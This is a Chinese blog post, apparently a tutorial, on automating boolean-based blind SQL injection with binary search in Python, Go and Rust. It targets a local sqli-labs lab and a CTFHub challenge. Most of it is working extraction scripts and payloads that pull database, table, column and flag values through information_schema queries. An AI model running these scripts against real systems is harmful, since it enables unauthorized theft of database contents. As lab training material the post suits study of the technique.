---
layout: post
lang: zh
title: 'SQL 布尔盲注自动化脚本二分查找实践与踩坑（Python, Golang, Rust）'
categories: injection automation
tags: injection sql security python golang rust algorithm automation
date: 2021-05-25
---

<p class="intro"><span class="dropcap">S</span>QL 盲注类型可以通过 sqlmap 简单地完成，亦可自己写一个简单的盲注脚本。现有的盲注脚本代码与文章质量良莠不齐，且大部分用的是线性搜索，效率奇低。</p>

故本文实践一下二分查找算法的盲注脚本，与此同时记录一下在这个过程中所遇到的坑点。（尤其是 Golang 实践中的坑）

为以后各语言的注入脚本提供一个基于二分查找的可实践版本的代码。

-----
Table of Contents

* TOC
{:toc}

-----

------------------

# 测试环境安装

本文主要使用两个环境。一个是 [docker 版的 sqli-labs](https://hub.docker.com/r/acgpiano/sqli-labs)，另一个是 CTFHub 的 SQL 布尔盲注（在线版）。

安装并运行的 sqli-labs 命令如下：

```shell
docker run --rm -d -p 80:80 acgpiano/sqli-labs
```

两个 URL 分别为如下：

```md
- http://192.168.3.104/Less-8/?id=1
- http://challenge-8542e4f21d675576.sandbox.ctfhub.com:10080/
```

# SQL 盲注脚本编写

现有盲注脚本主要分为线性搜索和二分查找算法。目前可以通过搜索引擎简单搜索到到均是线性搜索，且代码普遍质量达不到我个人认可的程度。

代码中有用的注释也比较少，可能大家写脚本的都不是专业的。因此本文提供 Python、Golang 和 Rust 版本的线性与二分查找算法的代码。

希望本文可以为高效率盲注提供一个具体的实践方案。

本节使用 sqli-labs 的 Less-8 来示范这个编写过程所遇到的问题。

**前提：** 本文中 Less-8 可用的 payload 为：

```shell
# 未被编码过
http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+
# 编码过亦可成功
http://192.168.3.104/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115 --+
# 编码过但是无法成功，因为关键的最后一个`+`被编码了
http://192.168.3.104/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115 --%2B
```

## Python 版

在盲注脚本中 python 库使用的是 [requests](https://docs.python-requests.org/)。

### 坑点 1：不使用 params 的方式完成 URL 拼接

**坑点 1：** 在 Python 中，只能通过 URL 拼接的方式来完成 URL 的构造。
**不能用 [params 的方式](https://docs.python-requests.org/en/latest/user/quickstart/#passing-parameters-in-urls)来完成拼接。**

比如举个例子：

```python
import requests

if __name__ == '__main__':
    base_url = "http://192.168.3.104/Less-8/"
    params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}
    r = requests.get(base_url, params=params)
    print(r.url)

    payload = "?id=1' and ascii(substr(database(),1,1))=115 --+"
    r2 = requests.get(base_url + payload)
    print(r2.url)
```

此时输出为：
```shell
# 这个是无效的payload，因此不能通过params的方式拼接
http://192.168.3.104/Less-8/?id=1%27+and+ascii%28substr%28database%28%29%2C1%2C1%29%29%3D115+--%2B
# 拼接后是原始有效的
http://192.168.3.104/Less-8/?id=1'%20and%20ascii(substr(database(),1,1))=115%20--+
```

### 线性搜索与二分查找算法实现

先考虑最简单的情况，只去“猜”一个字符。

1. 常规的线性搜索过程如下：

```python
# 可显的ASCII字符为：32(<空格>)~126(~)
for i in range(32, 127):
    payload = f"1' and ascii(substr(database(),{j},{j}))={i} --+"
    r = requests.get(base_url + payload)
    if mark in r.text:
        db_name += chr(i)
        print('database:', db_name)
        # 注：使用break来提前退出
        break
```

2. 二分算法实现查找过程：

原理如下：与传统的二分算法不同在于，是否能够找得到对 SQL 盲注来说是一件非常重要的事情。

网络上有的作者写的是不能判断，因此程序或有 bug。

其实没有必要，只需利用二分查找过程中的“相等匹配”即可“立刻”判断出是否找到。

```python
low = 32
high = 126
while high >= low:
    mid = (low + high) // 2  # 取整

    # 第一次判断是否相等
    payload = f"1' and ascii(substr(database(),{j},{j}))={mid} --+"
    r = requests.get(base_url + payload)
    if mark in r.text:
        db_name += chr(mid)
        print('database:', db_name)
        exit_flag = False
        break
    pass

    # 再判断范围，然后缩小范围
    payload = f"1' and ascii(substr(database(),{j},{j}))>{mid} --+"
    r = requests.get(base_url + payload)
    if mark in r.text:
        low = mid + 1
    else:
        high = mid - 1
    pass
```

### 找出完整信息

在上述的基础之上，怎么知道当前的字符是否判断完整？

针对于这个问题，有网友提出解决办法是在“猜”字符 ASCII 码前，先用 `length()`“猜”出长度即可控制程序循环逻辑。

但这无异于增加程序逻辑复杂性。解决办法其实比较简单，用两层循环即可完成该目标。

线性搜索如下：

```python
j = 1
exit_flag = False
while not exit_flag:
    # 总是假设该轮循环会退出
    exit_flag = True
    for i in range(32, 127):
        payload = f"1' and ascii(substr(database(),{j},{j}))={i} --+"
        r = requests.get(base_url + payload)
        if mark in r.text:
            db_name += chr(i)
            print('database:', db_name)
            # 已找到一个字符，说明下一轮「可能」还会有字符，因此不能退出
            exit_flag = False
            break
        pass
    j += 1
return db_name
```

二分查找如下：

```python
j = 1
exit_flag = False
while not exit_flag:
    # 总是假设该轮循环会退出
    exit_flag = True
    low = 32
    high = 126
    while high >= low:
        mid = (low + high) // 2
        payload = f"1' and ascii(substr(database(),{j},{j}))={mid} --+"
        r = requests.get(base_url + payload)
        if mark in r.text:
            db_name += chr(mid)
            print('database:', db_name)
            exit_flag = False
            break
        pass

        # another test for narrow down left or right range to search
        payload = f"1' and ascii(substr(database(),{j},{j}))>{mid} --+"
        r = requests.get(base_url + payload)
        if mark in r.text:
            low = mid + 1
        else:
            high = mid - 1
        pass
    j += 1
```

### 完整的代码

```python
import requests
import time

# base_url = "ttp://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"
base_url = "http://192.168.3.104/Less-8/?id="

mark = 'You are in'


# more detail: https://stackoverflow.com/a/803626/8587335
def measure_time(func):
    start_time = time.time()
    _ = func()
    end_time = time.time()
    print("Time: {} seconds".format(end_time - start_time))


def probe_database_linear():
    db_name = ''
    # params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}

    # all visible character is: 32( )->126(~)
    j = 1
    exit_flag = False
    while not exit_flag:
        # always assume we will exit in this loop
        exit_flag = True
        for i in range(32, 127):
            payload = f"1' and ascii(substr(database(),{j},{j}))={i} --+"
            r = requests.get(base_url + payload)
            if mark in r.text:
                db_name += chr(i)
                print('database:', db_name)
                exit_flag = False
                break
            pass
        j += 1
    return db_name


def probe_database_binary():
    db_name = ''
    # params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}

    # all visible character is: 32( )->126(~)
    j = 1
    exit_flag = False
    while not exit_flag:
        # always assume we will exit in this loop
        exit_flag = True
        low = 32
        high = 126
        while high >= low:
            mid = (low + high) // 2
            payload = f"1' and ascii(substr(database(),{j},{j})={mid} --+"
            r = requests.get(base_url + payload)
            if mark in r.text:
                db_name += chr(mid)
                print('database:', db_name)
                exit_flag = False
                break
            pass

            # another test for narrow down left or right range to search
            payload = f"1' and ascii(substr(database(),{j},{j}))>{mid} --+"
            r = requests.get(base_url + payload)
            if mark in r.text:
                low = mid + 1
            else:
                high = mid - 1
            pass
        j += 1
    return db_name


if __name__ == '__main__':
    print("linear:")
    measure_time(lambda: probe_database_linear())

    print("\nbinary:")
    measure_time(lambda: probe_database_binary())
)
```

看一下输出的结果与时间对比：

```shell
linear:
database: s
database: se
database: sec
database: secu
database: secur
database: securi
database: securit
database: security
Time: 11.133447170257568 seconds

binary:
database: s
database: se
database: sec
database: secu
database: secur
database: securi
database: securit
database: security
Time: 0.7845282554626465 seconds
```

可见二分查找的效率是有多么地显著。珍爱生命，还是尽可能有二分这种查找算法吧。写起来也并不复杂。

## Golang 版

Golang 版没有比较成熟与好用的库类似于 Python 的 requests，但是有一个类似的库叫：[grequests](https://github.com/levigross/grequests)。

这个库等价于 python 中的 requests，其使用的基础库是 `net/http`（等价于 Python 中的 urllib）。

### 坑点 2：未编码 URL

如果带着 Python 的相同写法来写代码，那么很容易出现你意料之外的事情。

**坑点 2：一定要编码 URL，否则会导致 URL“不全”的错误。**

什么意思呢？这里用代码举个例子：

```go
var mark = "You are in"
func main() {
    // 与Python相同的payload
	url := "http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"
	resp, err := grequests.Get(url, nil)
	if err != nil {
		log.Fatalln("Unable to make request: ", err)
	}
	if strings.Contains(resp.String(), mark) {
		fmt.Println("Yes! You are in!")
	} else {
		fmt.Println("Ohh! You are not in!")
	}
}
```

这段代码的执行结果为：

```shell
Ohh! You are not in!
```

咦～？怎么回事？为什么我们说好的 payload 没作用了？是这个 grequests 的库问题？还是 golang 的版本问题（我的 go 版本是 1.13.6）？还是这个 golang 版本的 `net/http` 的问题（比如这个 [issue](https://github.com/golang/go/issues/4013) ）？

不知道。很有可能在任何一个过程中出错。

### 排查错误与修复

1. 排查 URL

payload 也就是 URL 其实是很容易复制错的，因此优先看这个是否存在错误。

这时我们需要去打印出这个 request 的 url 的时候，经过我一段时间的探索后，发现 grequests 这个库没有办法显示出请求的 URL 一样，不像 Python 的 requests 库一样。比如这个 issue：
https://github.com/levigross/grequests/issues/49

很遗憾，grequests 不像 python 的 requests 库一样强大。

那么我们在网页服务端显示出我们需要执行的 sql 的 payload 即可。

第一步：

进入 docker 的这个 container：

```shell
# 换成自己的container ID
docker exec -it 5e37d8d /bin/bash
```

第二步：

给网页显示增加显示 SQL 的执行语句的功能：

```php
vi /var/www/html/Less-8/index.php

$sql="SELECT * FROM users WHERE id='$id' LIMIT 0,1";
# 在这句的下面新添加语句如下：
echo "<font size='5' color= '#99FF00'>";
echo 'Your SQL:'. $sql . '<br>';
echo "</font>";
```

然后增加输出 response 的 body 本身，代码修改如下：

```go
var mark = "You are in"
func main() {
	//url := "http://192.168.3.104/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115%20--+"
	url := "http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"
	resp, err := grequests.Get(url, nil)
	if err != nil {
		log.Fatalln("Unable to make request: ", err)
	}
	// 新加：打印出body本身：为了显示出URL是否生效
	fmt.Println(resp.String())
	if strings.Contains(resp.String(), mark) {
		fmt.Println("Yes! You are in")
	} else {
		fmt.Println("Ohh! You are not in!")
	}
}
```

结果如下：

```html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Less-8 Blind- Boolian- Single Quotes- String</title>
</head>

<body bgcolor="#000000">
<div style=" margin-top:60px;color:#FFF; font-size:23px; text-align:center">Welcome&nbsp;&nbsp;&nbsp;<font color="#FF0000"> Dhakkan </font><br>
<font size="3" color="#FFFF00">

<!-- 省略了一大堆空行 -->

<font size='5' color= '#99FF00'>Your SQL:SELECT * FROM users WHERE id='1'' LIMIT 0,1<br></font><font size="5" color="#FFFF00"></br></font><font color= "#0000ff" font size= 3>
</font> </div></br></br></br><center>
<img src="../images/Less-8.jpg" /></center>
</body>
</html>

Ohh! You are not in!
```

可以看到，我们的 SQL 语句变成了：

```sql
SELECT * FROM users WHERE id='1'' LIMIT 0,1
```

难怪 payload 没有生效！我们的语句就没有传达到服务端（因为这个 sqli-labs 是不自带 WAF 的）。

这个问题就说明了，我们在客户端进行发送的时候肯定出了什么问题。那么问题就定位在 grequests 或者 golang 的 `net/http` 身上。

2. 排查 grequests 或 golang 的 `net/http`

经过我个人的一番翻阅源代码，比如这个：
https://github.com/levigross/grequests/blob/253788527a1af7adb29e20dee7165c2b5b43f08f/request.go#L148-L210
grequests 用的就是 `net/http` 与 `net/url` 去发送请求的。因此 grequests 的库本身是没什么大的问题的。（虽然以我浅薄的认知，我觉得 grequests 是可以改进的，比如进行“适度地”编码。）

PS: 为什么是“适度地”编码？因为我们只想要它把空格编码成 `%20` 这种程度即可，对于末尾的关键性的`+`，我们不希望它编码为 `%2B`，否则我们的 payload 就会彻底失效。但是这个度其实是很难把握度，所以 grequests 维持这样的状态是完全可以理解的。

3. 修复由于 golang`net/http` 带来的问题

既然是 golang 自己的库解析的问题，说明我们很难通过修改底层的源代码去解决这个问题。那么我们来探索一下这个到底发生了什么，为什么会发生这样的情况。

在开始之前，我们可以根据上面的第二点，知道，我们的 payload 在 `'` 之后被“截断”了，也就是空格之后就没了。

那么我们猜测，这里是因为有空格的问题而被截断了。

理由有如下：
1. 在 payload 上看不到空格以后的东西了
2. 根据这个 [issue](https://github.com/golang/go/issues/4013)，可以知道，空格在 URL 中是危险的。因此要么会被转义成 `%20` 或者`+`（RFC 更加倾向前者）。

所以基于以上理由，我们假设：**URL 中未被编码的空格会被截断掉**。当然这个假设的前提是 golang 的版本是 `1.13.6`。可能在其他版本中会被休息（个人认为可能性不大，因为这个不算是一个 bug，而更加可能是一个 feature）。

我们来进行代码执行对比一下来验证我们的猜想。URL 我们测试两个：

```go
// 第一个为手工编码
url := "http://192.168.3.104/Less-8/?id=1%27%20and%20ascii(substr(database(),1,1))=115%20--+"
// 第二个为原始，未编码
url := "http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+"
```

测试结果如下：（为了显示简洁，不打印 response 的 body 内容了）

```shell
# 第一个结果：
Yes! You are in

# 第二个结果：
Ohh! You are not in!
```

我们的猜想合理且正确！**URL 中未被编码的空格的确会被截断掉。**

### 完整的代码

到此，遇到的问题也解决了。直接看下代码里怎么写。整体和 Python 版的类似，并无其他大的区别。

```go
package main

import (
	"fmt"
	"github.com/levigross/grequests"
	"log"
	"strings"
	"time"
)

var baseURL = "http://192.168.3.104/Less-8/?id="
var mark = "You are in"

// Comes from: https://dev.to/rubiin/measure-function-execution-time-in-golang-177l
func measureTime(start time.Time, name string) {
	elapsed := time.Since(start)
	log.Printf("Time for %s: %s", name, elapsed)
}

func probeDatabaseLinear() string {
	defer measureTime(time.Now(), "Linear")

    // 为了方便拼接和复用，此处把sqlPayload单独独立出来（亦可作为一个函数参数传递进来）
	sqlPayload := "database()"
	dbName := ""

	// all visible character is: 32( )->126(~)
	j := 1
	exitFlag := false
	for !exitFlag {
		// always assume we will exit in this loop
		exitFlag = true
		for i := 36; i < 127; i++  {
			// raw payload: 1' and ascii(substr(database(),1,1))=115 --+
			// We need to encode ` `(Space) into `%20` to ensure net/http processes URL correctly
			payload := fmt.Sprintf("1'%%20and%%20ascii(substr(%s,%d,%d))=%d%%20--+", sqlPayload, j, j, i)
			resp, err := grequests.Get(baseURL + payload, nil)
			if err != nil {
				log.Fatalln("Unable to make request: ", err)
			}
			if strings.Contains(resp.String(), mark) {
				dbName += string(i)
				fmt.Println("database: ", dbName)
				exitFlag = false
				break
			}
		}
		j += 1
	}

	return dbName
}


func probeDatabaseBinary() string {
	defer measureTime(time.Now(), "Binary")

	dbName := ""
	sqlPayload := "database()"

	// all visible character is: 32( )->126(~)
	j := 1
	exitFlag := false
	for !exitFlag {
		// always assume we will exit in this loop
		exitFlag = true
		low := 32
		high := 126
		for high >= low {
			mid := (low + high) / 2

			// test current position
			// raw payload: 1' and ascii(substr(database(),1,1))=114 --+
			// We need to encode ` `(Space) into `%20` to ensure net/http processes URL correctly
			payload := fmt.Sprintf("1'%%20and%%20ascii(substr(%s,%d,%d))=%d%%20--+", sqlPayload, j, j, mid)
			resp, err := grequests.Get(baseURL + payload, nil)
			if err != nil {
				log.Fatalln("Unable to make request: ", err)
			}
			if strings.Contains(resp.String(), mark) {
				dbName += string(mid)
				fmt.Println("database: ", dbName)
				exitFlag = false
				break
			}

			// another test for narrow down left or right range to search
			payload = fmt.Sprintf("1'%%20and%%20ascii(substr(%s,%d,%d))>%d%%20--+", sqlPayload, j, j, mid)
			resp, err = grequests.Get(baseURL + payload, nil)
			if err != nil {
				log.Fatalln("Unable to make request: ", err)
			}
			if strings.Contains(resp.String(), mark) {
				low = mid + 1
			} else {
				high = mid - 1
			}
		}
		j += 1
	}

	return dbName
}


func main() {
	probeDatabaseLinear()

	probeDatabaseBinary()
}
```

同样看下执行结果：

```shell
database:  s
database:  se
database:  sec
database:  secu
database:  secur
database:  securi
database:  securit
database:  security
2021/05/28 15:36:44 Time for Linear: 2.852781115s
database:  s
database:  se
database:  sec
database:  secu
database:  secur
database:  securi
database:  securit
database:  security
2021/05/28 15:36:44 Time for Binary: 351.54255ms
```

额～虽然可能大多数人普遍认为安全行业的工具类东西不需要考虑性能，但是 Golang 的这个效率的确很香。

### 其他想法与测试

那么，我们能不能不手工去编码，这样不优雅啊，直接去调用 golang 的 `net/url` 来帮我们编码呢？

想法很好，但是很可惜不能。golang 的 url 编码太彻底了。会让我们的 url payload 失效。

我们举个例子：

```go
package main

import (
	"fmt"
	"net/url"
)

func main() {
	// Let's start with a base url
	baseUrl, err := url.Parse("http://192.168.3.104")
	if err != nil {
		fmt.Println("Malformed URL: ", err.Error())
		return
	}

	// Add a Path Segment (Path segment is automatically escaped)
	baseUrl.Path += "Less-8/"

	// Prepare Query Parameters
	params := url.Values{}
	params.Add("id", "1' and ascii(substr(database(),1,1))=115 --+")

	// Add Query Parameters to the URL
	baseUrl.RawQuery = params.Encode() // Escape Query Parameters

	fmt.Printf("Encoded URL is %q\n", baseUrl.String())
}
```

然后结果为：
```shell
Encoded URL is "http://192.168.3.104/Less-8/?id=1%27+and+ascii%28substr%28database%28%29%2C1%2C1%29%29%3D115+--%2B"
```

未去访问这个 url 就知道不行了，最后一个`+` 被编码了。

不如真实访问一下看看网页的 payload 是怎样的：
```sql
Your SQL:SELECT * FROM users WHERE id='1' and ascii(substr(database(),1,1))=115 --+' LIMIT 0,1
```

果然没有 `You are in` 的标示，通过 SQL 也可以看出来为什么我们的 payload 不成功。

因此，结论：**当我们有这个需求的时候，只能通过手工编码。**

## Rust 版

Rust 中的有没有 python 一样的 requests 库呢？
答：还真没有可用且成熟的（截止 2021 年 5 月）。有一个 [requests 库](https://docs.rs/requests)，但是这个库是 3 年前更新的，你敢用吗？我不敢。

但是，Rust 中有比 python 的 requets 的库更强大的库：[reqwest](https://docs.rs/reqwest)。

它虽然没有类似于 Python 的 requests 库一样的 API，但是它足够强大，甚至支持默认支持异步。

所以，python 的 requests 库等同于 Rust 的 reqwest，python 的 `urllib` 等同于 Rust 的 `Hyper`（其实更加与 Golang 的 `net/http` 更像）。

### 坑点 3：Rust 中坑点

Rust 这么完美的语言怎么可能有坑点？没有的。

### 简单的非异步 reqwest 示例

由于 reqwest 默认启用异步的 feature，但是我们只请求简单的内容，无需用上异步这么复杂又牛逼的东西。

因此在 `Cargo.toml` 中增加如下内容以启用 `blocking` 的 feature：

```toml
[dependencies]
reqwest = { version = "0.11.3", features = ["blocking"] }
```

主要的代码如下：
```rust
fn main() -> Result<(), Box<dyn std::error::Error>> {
    let url = "http://192.168.3.104/Less-8/?id=1' and ascii(substr(database(),1,1))=115 --+";
    let mark = "You are in";

    // 类似于python的reqwest库
    let r = reqwest::blocking::get(url)?;
    let body = r.text()?;

    if body.contains(mark) {
        println!("Yes! You are in!");
    }
    Ok(())
}
```

可以看到输出为：
```shell
Yes! You are in!
```

如果不关注语法细节，整体的理解起来还是很简单的。而且没有 Golang 那样的编码问题。

### 完整的代码

与 Python 的逻辑类似，没有什么不同的地方。

PS: 此处使用闭包来测量函数执行的时间。

```rust
use std::time::Instant;

const BASE_URL: &str = "http://192.168.3.104/Less-8/?id=";
const MARK: &str = "You are in";

// https://stackoverflow.com/a/25182801/8587335
fn measure_time<F: FnOnce()>(name: String, func: F) {
    let start = Instant::now();
    func();
    let duration = start.elapsed();
    println!("Time elapsed in {} is: {:?}", name, duration);
}

fn probe_database_linear() -> Result<String, Box<dyn std::error::Error>> {
    let mut db_name = String::new();

    let sql_payload = "database()";

    let mut j = 1;
    let mut exit_flag = false;
    while !exit_flag {
        // always assume we will exit in this loop
        exit_flag = true;

        for i in 32u8..127u8 {
            let payload = format!(
                "1' and ascii(substr({},{},{}))={} --+",
                sql_payload, j, j, i
            );
            let url = format!("{}{}", BASE_URL, payload);
            let r = reqwest::blocking::get(url)?;
            let body = r.text()?;
            if body.contains(MARK) {
                db_name.push(i as char);
                println!("database: {}", db_name);
                exit_flag = false;
                break;
            }
        }
        j += 1;
    }

    Ok(db_name)
}

fn probe_database_binary() -> Result<String, Box<dyn std::error::Error>> {
    let mut db_name = String::new();

    let sql_payload = "database()";

    let mut j = 1;
    let mut exit_flag = false;
    while !exit_flag {
        // always assume we will exit in this loop
        exit_flag = true;

        let mut low = 32u8;
        let mut high = 126u8;
        while high >= low {
            let mid = (low + high) / 2;
            let payload = format!(
                "1' and ascii(substr({},{},{}))={} --+",
                sql_payload, j, j, mid
            );
            let url = format!("{}{}", BASE_URL, payload);
            let r = reqwest::blocking::get(url)?;
            let body = r.text()?;
            if body.contains(MARK) {
                db_name.push(mid as char);
                println!("database: {}", db_name);
                exit_flag = false;
                break;
            }

            // another test for narrow down left or right range to search
            let payload = format!(
                "1' and ascii(substr({},{},{}))>{} --+",
                sql_payload, j, j, mid
            );
            let url = format!("{}{}", BASE_URL, payload);
            let r = reqwest::blocking::get(url)?;
            let body = r.text()?;
            match body.contains(MARK) {
                true => low = mid + 1,
                false => high = mid - 1,
            }
        }
        j += 1;
    }

    Ok(db_name)
}

fn main() {
    measure_time("Linear".to_string(), || {
        let _ = probe_database_linear();
    });

    let _ = measure_time("Binary".to_string(), || {
        let _ = probe_database_binary();
    });
}
```

同样来看一下时间：

```shell
database: s
database: se
database: sec
database: secu
database: secur
database: securi
database: securit
database: security
Time elapsed in Linear is: 5.873950016s
database: s
database: se
database: sec
database: secu
database: secur
database: securi
database: securit
database: security
Time elapsed in Binary is: 788.546473ms
```
时间还是比 Golang 要长一点，所以还是 Golang 可能会更香一点。

# 实践
1. 启动测试环境

在 CTFHub 上启动布尔盲注题目环境。获得环境链接如下：

```shell
http://challenge-8542e4f21d675576.sandbox.ctfhub.com:10080/
```

2. 完整的盲注过程代码

这部分的代码，有几个需要注意的点：
- 代码中通过 `sql_payload` 独立出来使语句变短以及可读
- 使用 `group_concat()` 函数来把多个结果绑成一个结果输出

如果不用 `group_concat()`，那么需要通过调节 `limit 0,1` 来去“猜”不同的 ASCII 码。

比如完整的 SQL 的 payload 如下：

```shell
# 一次只能猜一个，除非调节limit的参数
sql_payload = "select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1"
# 一次性把所有的结果用`,`链接（group_concat默认）
sql_payload = "select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = database()"
```

这样一来，程序的逻辑也会降低。

```python
import requests
import time

base_url = "http://challenge-8542e4f21d675576.sandbox.ctfhub.com:10080/?id="

mark = 'query_success'


# more detail: https://stackoverflow.com/a/803626/8587335
def measure_time(func):
    start_time = time.time()
    _ = func()
    end_time = time.time()
    print("Time: {} seconds".format(end_time - start_time))


def probe_database_linear():
    db_name = ''
    # params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}

    # all visible character is: 32( )->126(~)
    j = 1
    exit_flag = False
    while not exit_flag:
        # always assume we will exit in this loop
        exit_flag = True
        for i in range(32, 127):
            payload = f"1 and ascii(substr(database(),{j},{j}))={i} --+"
            r = requests.get(base_url + payload)
            if mark in r.text:
                db_name += chr(i)
                print('database:', db_name)
                exit_flag = False
                break
            pass
        j += 1
    return db_name


def probe_database_binary():
    db_name = ''
    # params = {'id': "1' and ascii(substr(database(),1,1))=115 --+"}

    # all visible character is: 32( )->126(~)
    j = 1
    exit_flag = False
    while not exit_flag:
        # always assume we will exit in this loop
        exit_flag = True
        low = 32
        high = 126
        while high >= low:
            mid = (low + high) // 2
            payload = f"1 and ascii(substr(database(),{j},{j}))={mid}"
            r = requests.get(base_url + payload)
            if mark in r.text:
                db_name += chr(mid)
                print('database:', db_name)
                exit_flag = False
                break
            pass

            # another test for narrow down left or right range to search
            payload = f"1 and ascii(substr(database(),{j},{j}))>{mid}"
            r = requests.get(base_url + payload)
            if mark in r.text:
                low = mid + 1
            else:
                high = mid - 1
            pass
        j += 1
    return db_name


def probe_table_binary(db_name):
    table_name = ''
    # sql_payload = "select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1"
    # 这里解决了一个痛点：对于多个表名，通过group_concat()链接，那么就不需要去改变`limit 0,1`
    sql_payload = "select group_concat(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA = database()"

    # all visible character is: 32( )->126(~)
    j = 1
    exit_flag = False
    while not exit_flag:
        # always assume we will exit in this loop
        exit_flag = True
        low = 32
        high = 126
        while high >= low:
            mid = (low + high) // 2
            payload = f"1 and ascii(substr(({sql_payload}),{j},{j}))={mid}"
            r = requests.get(base_url + payload)
            if mark in r.text:
                table_name += chr(mid)
                print('table:', table_name)
                exit_flag = False
                break
            pass

            # another test for narrow down left or right range to search
            payload = f"1 and ascii(substr(({sql_payload}),{j},{j}))>{mid}"
            r = requests.get(base_url + payload)
            if mark in r.text:
                low = mid + 1
            else:
                high = mid - 1
            pass
        j += 1
    return table_name


def probe_column_binary(table_name):
    column_name = ''
    # sql_payload = "select TABLE_NAME from information_schema.TABLES where TABLE_SCHEMA = database() limit 0,1"
    # payload: select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = 'flag' and TABLE_SCHEMA = database()
    sql_payload = f"select group_concat(COLUMN_NAME) from information_schema.COLUMNS where TABLE_NAME = '{table_name}' and TABLE_SCHEMA = database()"

    # all visible character is: 32( )->126(~)
    j = 1
    exit_flag = False
    while not exit_flag:
        # always assume we will exit in this loop
        exit_flag = True
        low = 32
        high = 126
        while high >= low:
            mid = (low + high) // 2
            payload = f"1 and ascii(substr(({sql_payload}),{j},{j}))={mid}"
            r = requests.get(base_url + payload)
            if mark in r.text:
                column_name += chr(mid)
                print('column:', column_name)
                exit_flag = False
                break
            pass

            # another test for narrow down left or right range to search
            payload = f"1 and ascii(substr(({sql_payload}),{j},{j}))>{mid}"
            r = requests.get(base_url + payload)
            if mark in r.text:
                low = mid + 1
            else:
                high = mid - 1
            pass
        j += 1
    return column_name


def probe_flag(table_name, column_name):
    flag = ''
    # payload: select flag from flag
    sql_payload = f"select {column_name} from {table_name}"

    # all visible character is: 32( )->126(~)
    j = 1
    exit_flag = False
    while not exit_flag:
        # always assume we will exit in this loop
        exit_flag = True
        low = 32
        high = 126
        while high >= low:
            mid = (low + high) // 2
            payload = f"1 and ascii(substr(({sql_payload}),{j},{j}))={mid}"
            r = requests.get(base_url + payload)
            if mark in r.text:
                flag += chr(mid)
                print('flag:', flag)
                exit_flag = False
                break
            pass

            # another test for narrow down left or right range to search
            payload = f"1 and ascii(substr(({sql_payload}),{j},{j}))>{mid}"
            r = requests.get(base_url + payload)
            if mark in r.text:
                low = mid + 1
            else:
                high = mid - 1
            pass
        j += 1
    return flag


if __name__ == '__main__':
    print("probe db_name:")
    measure_time(lambda: probe_database_binary())

    print("\nprobe table_name:")
    measure_time(lambda: probe_table_binary(db_name="sqli"))

    print("\nprobe column_name:")
    measure_time(lambda: probe_column_binary(table_name="flag"))

    print("\nprobe flag:")
    measure_time(lambda: probe_flag(table_name="flag", column_name="flag"))

```

输出结果如下：

```shell
probe db_name:
database: s
database: sq
database: sql
database: sqli
Time: 56.579747915267944 seconds

probe table_name:
table: n
table: ne
table: new
table: news
table: news,
table: news,f
table: news,fl
table: news,fla
table: news,flag
Time: 94.11818170547485 seconds

probe column_name:
column: f
column: fl
column: fla
column: flag
Time: 46.16322708129883 seconds

probe flag:
flag: c
flag: ct
flag: ctf
flag: ctfh
flag: ctfhu
flag: ctfhub
flag: ctfhub{
flag: ctfhub{8
flag: ctfhub{85
flag: ctfhub{851
flag: ctfhub{851b
flag: ctfhub{851b6
flag: ctfhub{851b66
flag: ctfhub{851b66a
flag: ctfhub{851b66af
flag: ctfhub{851b66af4
flag: ctfhub{851b66af41
flag: ctfhub{851b66af41f
flag: ctfhub{851b66af41ff
flag: ctfhub{851b66af41ff5
flag: ctfhub{851b66af41ff53
flag: ctfhub{851b66af41ff531
flag: ctfhub{851b66af41ff5312
flag: ctfhub{851b66af41ff5312b
flag: ctfhub{851b66af41ff5312b8
flag: ctfhub{851b66af41ff5312b81
flag: ctfhub{851b66af41ff5312b816
flag: ctfhub{851b66af41ff5312b8167
flag: ctfhub{851b66af41ff5312b81674
flag: ctfhub{851b66af41ff5312b816748
flag: ctfhub{851b66af41ff5312b8167487
flag: ctfhub{851b66af41ff5312b8167487}
Time: 335.36650919914246 seconds
```

**PS1：** 可以注意到，这个时间比本地的 Docker 的环境慢了很多。那是因为 CTFHub 一次的请求最大就是这么多。若是本地无限制跑，速度也是很快的。

**PS2：** 无法“完全自动化”。必须有一个类似于 sqlmap 那样的交互过程。毕竟你所需要的表、列与字段都是不确定的。

# 总结

1. 坑点总结

   - Python 的 requests 库的 params 不能用。需要通过字符串拼接的方式完成，但是不需要手动编码。

   - Golang 的 `net/http` 会截断空格，需要手动编码。

   - Rust 无坑点

2. 在几个语言里，都有衡量时间的函数来 handle。具体可以参考另一篇文章：

   [优雅测函数执行时间（Rust-Golang-Python）]({% post_url 2021-05-26-优雅测函数执行时间（Rust-Golang-Python） %})

3. 希望以上内容对你有帮助。

<center><blockquote>The End</blockquote></center>
